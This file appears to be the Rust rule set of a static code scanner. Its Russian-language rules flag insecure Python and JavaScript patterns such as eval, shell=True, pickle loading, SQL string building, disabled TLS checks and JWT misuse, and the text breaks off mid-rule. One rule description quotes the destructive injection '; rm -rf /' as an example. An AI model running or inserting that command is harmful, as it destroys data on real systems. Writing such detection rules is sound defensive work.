use crate::model::{Confidence, Language, Severity};
use once_cell::sync::Lazy;
use regex::{Regex, RegexSet};
use std::collections::HashMap;

/// A single detection rule. Patterns use the `regex` crate, which has no
/// lookaround — "match X unless Y" is expressed with `unless_contains` instead.
pub struct Rule {
    pub id: &'static str,
    pub title: &'static str,
    pub description: &'static str,
    pub recommendation: &'static str,
    pub severity: Severity,
    pub confidence: Confidence,
    pub category: &'static str,
    pub languages: &'static [Language],
    pub pattern: &'static str,
    /// Drop the match if the matched text contains any of these (case-insensitive).
    pub unless_contains: &'static [&'static str],
    pub cwe: &'static [&'static str],
    pub owasp: Option<&'static str>,
    pub references: &'static [&'static str],
    /// Rules that are noisy in test code and safe to suppress there.
    pub skip_in_tests: bool,
}

const JS_FAMILY: &[Language] = &[
    Language::JavaScript,
    Language::TypeScript,
    Language::Jsx,
    Language::Tsx,
];
const PY: &[Language] = &[Language::Python];
const RS: &[Language] = &[Language::Rust];

const OWASP_INJECTION: &str = "A03:2021 – Injection";
const OWASP_CRYPTO: &str = "A02:2021 – Cryptographic Failures";
const OWASP_MISCONFIG: &str = "A05:2021 – Security Misconfiguration";
const OWASP_ACCESS: &str = "A01:2021 – Broken Access Control";
const OWASP_INTEGRITY: &str = "A08:2021 – Software and Data Integrity Failures";
const OWASP_AUTH: &str = "A07:2021 – Identification and Authentication Failures";
const OWASP_DESIGN: &str = "A04:2021 – Insecure Design";
const OWASP_VULN_COMP: &str = "A06:2021 – Vulnerable and Outdated Components";

pub static RULES: &[Rule] = &[
    // ---------------------------------------------------------------- Python
    Rule {
        id: "VS-PY-001",
        title: "Вызов eval() с динамическими данными",
        description: "eval() выполняет переданную строку как код Python. Если в неё попадают данные от пользователя, атакующий получает выполнение произвольного кода в процессе приложения.",
        recommendation: "Уберите eval(). Для разбора данных используйте json.loads(), для literal-структур — ast.literal_eval(), для диспетчеризации — словарь функций.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: PY,
        pattern: r"\beval\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95", "CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-002",
        title: "Вызов exec() с динамическими данными",
        description: "exec() исполняет произвольный код Python. Любое влияние пользователя на аргумент означает полную компрометацию процесса.",
        recommendation: "Замените exec() явной логикой: словарь-диспетчер, importlib для загрузки модулей из белого списка.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: PY,
        pattern: r"\bexec\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95", "CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-003",
        title: "subprocess с shell=True",
        description: "shell=True запускает команду через системный шелл, поэтому метасимволы (; | & $() ``) в аргументах интерпретируются. Подстановка пользовательских данных даёт инъекцию команд.",
        recommendation: "Уберите shell=True и передавайте команду списком аргументов: subprocess.run([\"ls\", \"-l\", path]). Тогда аргументы не парсятся шеллом.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Инъекция команд",
        languages: PY,
        pattern: r"shell\s*=\s*True",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-004",
        title: "os.system() — выполнение команды через шелл",
        description: "os.system() всегда идёт через шелл и не умеет экранировать аргументы. Это классический вектор инъекции команд.",
        recommendation: "Используйте subprocess.run([...]) со списком аргументов и без shell=True.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Инъекция команд",
        languages: PY,
        pattern: r"\bos\.system\s*\(",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-005",
        title: "os.popen() — выполнение команды через шелл",
        description: "os.popen() запускает строку в шелле. Пользовательский ввод в этой строке приводит к инъекции команд.",
        recommendation: "Перейдите на subprocess.run([...], capture_output=True) без shell=True.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Инъекция команд",
        languages: PY,
        pattern: r"\bos\.popen\s*\(",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-006",
        title: "Десериализация через pickle",
        description: "pickle.load()/loads() при разборе данных вызывает конструкторы объектов и может выполнить произвольный код. Формат не предназначен для недоверенных данных.",
        recommendation: "Для обмена данными используйте JSON. Если pickle необходим — принимайте его только из доверенного источника и подписывайте (HMAC).",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: PY,
        pattern: r"\b(?:pickle|cPickle|_pickle|dill|shelve)\.loads?\s*\(",
        unless_contains: &[],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://docs.python.org/3/library/pickle.html#module-pickle"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-007",
        title: "yaml.load() без безопасного загрузчика",
        description: "Загрузчик по умолчанию в PyYAML умеет конструировать произвольные объекты Python, что даёт выполнение кода при разборе недоверенного YAML.",
        recommendation: "Используйте yaml.safe_load(data) или явно yaml.load(data, Loader=yaml.SafeLoader).",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Небезопасная десериализация",
        languages: PY,
        pattern: r"yaml\.load\s*\([^)]*\)",
        unless_contains: &["SafeLoader", "BaseLoader", "safe_load"],
        cwe: &["CWE-502"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://pyyaml.org/wiki/PyYAMLDocumentation"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-008",
        title: "SQL-запрос собирается f-строкой",
        description: "Подстановка значений в текст SQL через f-строку не экранирует кавычки и спецсимволы. Пользовательский ввод может изменить структуру запроса — это SQL-инъекция.",
        recommendation: "Используйте параметризованные запросы: cursor.execute(\"SELECT * FROM t WHERE id = %s\", (user_id,)). Драйвер сам выполнит экранирование.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "SQL-инъекция",
        languages: PY,
        pattern: r#"(?i)\.execute(?:many|script)?\s*\(\s*f["']"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-009",
        title: "SQL-запрос собирается конкатенацией или %-форматированием",
        description: "Склейка пользовательских данных с текстом SQL через + или % позволяет атакующему дописать собственные конструкции в запрос.",
        recommendation: "Передавайте значения отдельным параметром: cursor.execute(query, params). Никогда не форматируйте SQL строками.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: PY,
        pattern: r#"(?i)\.execute(?:many|script)?\s*\(\s*["'][^"']*(?:select|insert|update|delete|drop)[^"']*["']\s*(?:%|\+|\.format)"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-010",
        title: "Слабый хеш (MD5/SHA-1)",
        description: "MD5 и SHA-1 уязвимы к коллизиям и не годятся для подписей, проверки целостности и хранения паролей.",
        recommendation: "Для целостности берите hashlib.sha256. Для паролей — bcrypt, scrypt или argon2 (passlib/argon2-cffi), никогда не «сырой» хеш. Если хеш используется не для безопасности, добавьте usedforsecurity=False.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Криптография",
        languages: PY,
        pattern: r"hashlib\.(?:md5|sha1)\s*\(",
        unless_contains: &["usedforsecurity=False"],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-011",
        title: "Отключена проверка TLS-сертификата",
        description: "verify=False заставляет requests принимать любой сертификат. Соединение перестаёт защищать от man-in-the-middle: трафик можно прочитать и подменить.",
        recommendation: "Уберите verify=False. Для внутреннего CA укажите путь к его сертификату: requests.get(url, verify=\"/path/ca.pem\").",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: PY,
        pattern: r"verify\s*=\s*False",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-012",
        title: "Отключена проверка hostname в ssl",
        description: "check_hostname=False или CERT_NONE снимает проверку того, что сертификат выдан именно тому хосту, к которому идёт подключение.",
        recommendation: "Оставьте контекст по умолчанию: ssl.create_default_context(). Он включает и проверку цепочки, и проверку hostname.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: PY,
        pattern: r"check_hostname\s*=\s*False|CERT_NONE|_create_unverified_context",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-013",
        title: "Flask запущен с debug=True",
        description: "Debug-режим Flask включает интерактивную консоль Werkzeug. На доступном извне хосте это прямое выполнение кода без аутентификации.",
        recommendation: "Никогда не включайте debug в продакшене. Управляйте флагом через переменную окружения и по умолчанию держите его выключенным.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: PY,
        pattern: r"debug\s*=\s*True",
        unless_contains: &[],
        cwe: &["CWE-489"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/489.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-014",
        title: "Разбор XML уязвим к XXE и bomb-атакам",
        description: "Стандартные парсеры xml.etree, minidom и lxml по умолчанию могут раскрывать внешние сущности — это чтение локальных файлов и SSRF, а также exponential entity expansion.",
        recommendation: "Используйте defusedxml: from defusedxml.ElementTree import parse. Он отключает опасные возможности XML.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "XXE",
        languages: PY,
        pattern: r"(?:xml\.etree\.ElementTree|xml\.dom\.minidom|xml\.sax)\.(?:parse|fromstring|parseString)\s*\(",
        unless_contains: &["defusedxml"],
        cwe: &["CWE-611"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/611.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-015",
        title: "Слабый генератор случайных чисел для секретов",
        description: "Модуль random — предсказуемый PRNG (Mersenne Twister). Токены, пароли и ключи, полученные из него, восстанавливаются по нескольким выданным значениям.",
        recommendation: "Для всего, что связано с безопасностью, используйте secrets: secrets.token_urlsafe(32), secrets.choice(...).",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Криптография",
        languages: PY,
        pattern: r"random\.(?:random|randint|choice|randrange|sample|shuffle|getrandbits)\s*\(",
        unless_contains: &[],
        cwe: &["CWE-338", "CWE-330"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://docs.python.org/3/library/secrets.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-016",
        title: "tempfile.mktemp() — гонка при создании файла",
        description: "mktemp() только возвращает имя, не создавая файл. Между проверкой и созданием другой процесс может подставить симлинк (TOCTOU).",
        recommendation: "Используйте tempfile.NamedTemporaryFile() или mkstemp() — они атомарно создают файл с безопасными правами.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Работа с файлами",
        languages: PY,
        pattern: r"tempfile\.mktemp\s*\(",
        unless_contains: &[],
        cwe: &["CWE-377", "CWE-367"],
        owasp: Some(OWASP_DESIGN),
        references: &["https://cwe.mitre.org/data/definitions/377.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-017",
        title: "Jinja2 с отключённым автоэкранированием",
        description: "autoescape=False означает, что переменные вставляются в HTML как есть. Любые пользовательские данные в шаблоне становятся XSS.",
        recommendation: "Включите autoescape=True. Для отдельных доверенных фрагментов используйте markupsafe.Markup явно и осознанно.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "XSS",
        languages: PY,
        pattern: r"autoescape\s*=\s*False",
        unless_contains: &[],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-018",
        title: "assert используется для контроля доступа",
        description: "Интерпретатор с флагом -O полностью удаляет assert. Если на нём держится проверка прав, в оптимизированной сборке она просто исчезнет.",
        recommendation: "Заменяйте на явную проверку с исключением: if not user.is_admin: raise PermissionError(...).",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Контроль доступа",
        languages: PY,
        pattern: r"assert\s+.*(?:is_admin|is_authenticated|has_perm|is_staff|is_superuser|authorized)",
        unless_contains: &[],
        cwe: &["CWE-617", "CWE-285"],
        owasp: Some(OWASP_ACCESS),
        references: &["https://cwe.mitre.org/data/definitions/617.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-019",
        title: "Django запущен с DEBUG = True",
        description: "При DEBUG=True Django на любой ошибке отдаёт трейсбек с фрагментами кода, настройками и значениями переменных окружения.",
        recommendation: "В продакшене DEBUG = False. Значение берите из переменной окружения, а ALLOWED_HOSTS задайте явно.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: PY,
        pattern: r"(?m)^\s*DEBUG\s*=\s*True",
        unless_contains: &[],
        cwe: &["CWE-489", "CWE-215"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://docs.djangoproject.com/en/stable/ref/settings/#debug"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-020",
        title: "Привязка сервера ко всем интерфейсам",
        description: "0.0.0.0 открывает порт на всех сетевых интерфейсах, включая внешние. Часто это делают для отладки и забывают вернуть обратно.",
        recommendation: "Слушайте 127.0.0.1, если сервис нужен только локально. Наружу публикуйте через reverse-proxy с TLS и аутентификацией.",
        severity: Severity::Low,
        confidence: Confidence::Low,
        category: "Конфигурация",
        languages: PY,
        pattern: r#"(?:host\s*=\s*|bind\s*\(\s*\(\s*)["']0\.0\.0\.0["']"#,
        unless_contains: &[],
        cwe: &["CWE-1327"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/1327.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-021",
        title: "Права 0777 на файл или каталог",
        description: "chmod 0777 даёт запись любому локальному пользователю. Исполняемый файл или скрипт с такими правами можно подменить.",
        recommendation: "Выдавайте минимально необходимые права: 0o600 для секретов, 0o644 для обычных файлов, 0o755 для каталогов.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Работа с файлами",
        languages: PY,
        pattern: r"chmod\s*\([^)]*0o?777",
        unless_contains: &[],
        cwe: &["CWE-732"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://cwe.mitre.org/data/definitions/732.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-022",
        title: "extractall() — распаковка без проверки путей",
        description: "tarfile.extractall и zipfile.extractall доверяют путям внутри архива. Запись вида ../../etc даёт запись за пределы целевого каталога (Zip Slip).",
        recommendation: "Проверяйте каждый путь перед распаковкой или используйте tarfile с filter=\"data\" (Python 3.12+), отсекающим выходы за каталог.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Path traversal",
        languages: PY,
        pattern: r"\.extractall\s*\(",
        unless_contains: &["filter="],
        cwe: &["CWE-22"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/22.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-023",
        title: "SSTI: render_template_string с данными",
        description: "render_template_string компилирует переданную строку как шаблон Jinja2. Пользовательский ввод в ней приводит к инъекции шаблона и выполнению кода на сервере.",
        recommendation: "Рендерите статические шаблоны из файлов и передавайте данные через контекст, а не собирайте текст шаблона из ввода.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: PY,
        pattern: r"render_template_string\s*\(",
        unless_contains: &[],
        cwe: &["CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/94.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-024",
        title: "JWT: проверка подписи отключена",
        description: "verify=False или verify_signature: False заставляет jwt.decode принять токен без проверки подписи. Атакующий сможет подделать любые claims.",
        recommendation: "Всегда проверяйте подпись: jwt.decode(token, key, algorithms=[\"RS256\"]). Не отключайте verify_signature.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Аутентификация",
        languages: PY,
        pattern: r#"(?i)verify_signature["']?\s*:\s*False|jwt\.decode\s*\([^)]*\bverify\s*=\s*False"#,
        unless_contains: &[],
        cwe: &["CWE-347"],
        owasp: Some(OWASP_AUTH),
        references: &["https://cwe.mitre.org/data/definitions/347.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PY-025",
        title: "mark_safe отключает экранирование (XSS)",
        description: "mark_safe помечает строку как безопасный HTML, и Django вставляет её в шаблон без экранирования. Пользовательский ввод в ней даёт XSS.",
        recommendation: "Не вызывайте mark_safe на пользовательских данных. Для нужной разметки используйте bleach.clean с белым списком тегов.",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "XSS",
        languages: PY,
        pattern: r"\bmark_safe\s*\(",
        unless_contains: &[],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-PY-026",
        title: "SSH: проверка ключа хоста отключена (paramiko)",
        description: "AutoAddPolicy и WarningPolicy принимают ключ хоста автоматически. Соединение перестаёт защищать от man-in-the-middle.",
        recommendation: "Используйте RejectPolicy и заранее загруженные known_hosts через load_system_host_keys.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: PY,
        pattern: r"(?:AutoAddPolicy|WarningPolicy)\b",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------ JavaScript / TS
    Rule {
        id: "VS-JS-001",
        title: "Вызов eval()",
        description: "eval() исполняет строку как JavaScript в текущей области видимости. С данными от пользователя это выполнение произвольного кода и кража сессии.",
        recommendation: "Уберите eval(). Для JSON — JSON.parse(), для выбора поведения — объект-диспетчер или switch.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: JS_FAMILY,
        pattern: r"\beval\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95", "CWE-94"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JS-002",
        title: "Конструктор Function() из строки",
        description: "new Function(str) компилирует строку в функцию — это тот же eval, только через другой вход, и он так же обходится CSP-политикой без unsafe-eval.",
        recommendation: "Замените на обычную функцию или таблицу обработчиков. Если нужен пользовательский сценарий — используйте песочницу с ограниченным DSL.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: JS_FAMILY,
        pattern: r"new\s+Function\s*\(",
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JS-003",
        title: "React: dangerouslySetInnerHTML",
        description: "Этот проп отключает экранирование React и вставляет HTML как есть. Если строка содержит пользовательские данные, это XSS.",
        recommendation: "Рендерите как текст: {value}. Если нужен HTML — прогоните через DOMPurify.sanitize(html) перед вставкой.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "XSS",
        languages: JS_FAMILY,
        pattern: r"dangerouslySetInnerHTML",
        unless_contains: &["DOMPurify", "sanitize"],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-004",
        title: "Присваивание в innerHTML / outerHTML",
        description: "innerHTML парсит строку как HTML. Пользовательские данные в ней приводят к XSS: скрипт исполнится в контексте вашего домена.",
        recommendation: "Используйте textContent для текста. Для HTML — DOMPurify.sanitize() или создание узлов через createElement.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "XSS",
        languages: JS_FAMILY,
        pattern: r"\.(?:inner|outer)HTML\s*(?:\+)?=",
        unless_contains: &["DOMPurify", "sanitize", r#"= ""#, "= ''"],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-005",
        title: "insertAdjacentHTML с динамическими данными",
        description: "Метод вставляет строку как разметку, минуя экранирование. Тот же вектор XSS, что и innerHTML.",
        recommendation: "Вставляйте узлы через insertAdjacentText или createElement, либо санитизируйте строку DOMPurify.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "XSS",
        languages: JS_FAMILY,
        pattern: r"\.insertAdjacentHTML\s*\(",
        unless_contains: &["DOMPurify", "sanitize"],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-006",
        title: "document.write()",
        description: "document.write() пишет строку прямо в поток документа как HTML. Это и XSS-вектор, и причина блокировки парсера.",
        recommendation: "Стройте DOM через createElement/appendChild или используйте фреймворк. От document.write() стоит отказаться полностью.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "XSS",
        languages: JS_FAMILY,
        pattern: r"document\.write(?:ln)?\s*\(",
        unless_contains: &[],
        cwe: &["CWE-79"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/79.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-007",
        title: "child_process.exec() — команда через шелл",
        description: "exec() передаёт строку системному шеллу целиком. Пользовательские данные в команде дают инъекцию: `; rm -rf /` отработает.",
        recommendation: "Используйте execFile() или spawn() с массивом аргументов — они не запускают шелл: execFile(\"git\", [\"log\", branch]).",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Инъекция команд",
        languages: JS_FAMILY,
        pattern: r"(?:child_process\.)?exec(?:Sync)?\s*\(\s*[`\x22']",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-008",
        title: "spawn/execFile с shell: true",
        description: "Опция shell:true возвращает разбор аргументов шеллу и сводит на нет главное преимущество spawn перед exec.",
        recommendation: "Уберите shell:true и передавайте аргументы массивом.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Инъекция команд",
        languages: JS_FAMILY,
        pattern: r"shell\s*:\s*true",
        unless_contains: &[],
        cwe: &["CWE-78"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/78.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-009",
        title: "SQL-запрос собирается шаблонной строкой",
        description: "Интерполяция ${...} в тексте SQL не экранирует кавычки. Пользовательский ввод меняет структуру запроса — SQL-инъекция.",
        recommendation: "Передавайте значения плейсхолдерами: db.query(\"SELECT * FROM t WHERE id = ?\", [id]). В ORM пользуйтесь билдером, а не raw.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "SQL-инъекция",
        languages: JS_FAMILY,
        pattern: r"(?i)(?:query|execute|raw)\s*\(\s*`[^`]*(?:select|insert|update|delete|drop)[^`]*\$\{",
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-010",
        title: "SQL-запрос собирается конкатенацией",
        description: "Склейка SQL со значениями через + позволяет атакующему дописать в запрос свои условия или подзапросы.",
        recommendation: "Используйте параметризованные запросы вместо конкатенации строк.",
        severity: Severity::Critical,
        confidence: Confidence::Medium,
        category: "SQL-инъекция",
        languages: JS_FAMILY,
        pattern: r#"(?i)(?:query|execute|raw)\s*\(\s*["'][^"']*(?:select|insert|update|delete|drop)[^"']*["']\s*\+"#,
        unless_contains: &[],
        cwe: &["CWE-89"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/89.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-011",
        title: "Отключена проверка TLS через NODE_TLS_REJECT_UNAUTHORIZED",
        description: "Значение 0 глобально отключает проверку сертификатов для всего процесса Node. Все исходящие HTTPS-соединения становятся уязвимы к MITM.",
        recommendation: "Удалите эту строку. Для самоподписанного сертификата добавьте свой CA через опцию ca или переменную NODE_EXTRA_CA_CERTS.",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: JS_FAMILY,
        pattern: r#"NODE_TLS_REJECT_UNAUTHORIZED["']?\s*\]?\s*=\s*["']?0"#,
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://nodejs.org/api/cli.html#node_tls_reject_unauthorizedvalue"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-012",
        title: "rejectUnauthorized: false",
        description: "Опция отключает проверку цепочки сертификатов для конкретного соединения — трафик можно перехватить и подменить.",
        recommendation: "Уберите опцию. Для внутреннего CA передайте его сертификат в поле ca.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: JS_FAMILY,
        pattern: r"rejectUnauthorized\s*:\s*false",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-013",
        title: "JWT: разрешён алгоритм none или не задан список алгоритмов",
        description: "Алгоритм none означает подпись без ключа — токен можно подделать целиком. Отсутствие явного списка алгоритмов открывает атаку смены алгоритма (RS256 → HS256).",
        recommendation: "Всегда указывайте алгоритм явно: jwt.verify(token, key, { algorithms: [\"RS256\"] }).",
        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Аутентификация",
        languages: JS_FAMILY,
        pattern: r#"(?i)algorithms?\s*:\s*\[?\s*["']none["']"#,
        unless_contains: &[],
        cwe: &["CWE-347"],
        owasp: Some(OWASP_AUTH),
        references: &["https://cwe.mitre.org/data/definitions/347.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-014",
        title: "jwt.decode() вместо jwt.verify()",
        description: "decode() читает содержимое токена, но не проверяет подпись. Доверять таким данным нельзя — их может подделать кто угодно.",
        recommendation: "Для любых решений на основе токена используйте jwt.verify() с ключом и явным списком алгоритмов.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Аутентификация",
        languages: JS_FAMILY,
        pattern: r"jwt\.decode\s*\(",
        unless_contains: &[],
        cwe: &["CWE-347"],
        owasp: Some(OWASP_AUTH),
        references: &["https://cwe.mitre.org/data/definitions/347.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-015",
        title: "Math.random() для токена или идентификатора сессии",
        description: "Math.random() не криптостойкий: состояние генератора восстанавливается по нескольким значениям, а значит токены предсказуемы.",
        recommendation: "В браузере — crypto.getRandomValues(new Uint8Array(32)). В Node — crypto.randomBytes(32) или crypto.randomUUID().",
        severity: Severity::Medium,
        confidence: Confidence::Low,
        category: "Криптография",
        languages: JS_FAMILY,
        pattern: r"Math\.random\s*\(\s*\)",
        unless_contains: &[],
        cwe: &["CWE-338", "CWE-330"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/338.html"],
        skip_in_tests: true,
    },
    Rule {
        id: "VS-JS-016",
        title: "Устаревший crypto.createCipher()",
        description: "createCipher() выводит ключ из пароля слабой схемой и работает без IV, что даёт повторяющийся шифротекст для одинаковых данных.",
        recommendation: "Используйте crypto.createCipheriv(\"aes-256-gcm\", key, iv) со случайным IV на каждое сообщение.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Криптография",
        languages: JS_FAMILY,
        pattern: r"crypto\.create(?:Cipher|Decipher)\s*\(",
        unless_contains: &["createCipheriv", "createDecipheriv"],
        cwe: &["CWE-327"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://nodejs.org/api/crypto.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JS-017",
        title: "Слабый хеш (MD5/SHA-1) в crypto",
        description: "MD5 и SHA-1 подвержены коллизиям, их нельзя применять для подписей и проверки целостности.",
        recommendation: "Берите sha256 или sha512. Для паролей — bcrypt/argon2, а не «сырой» хеш.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Криптография",
        languages: JS_FAMILY,
        pattern: r#"createHash\s*\(\s*["'](?:md5|sha1)["']"#,
        unless_contains: &[],
        cwe: &["CWE-327", "CWE-328"],
        owasp: Some(OWASP_CRYPTO),
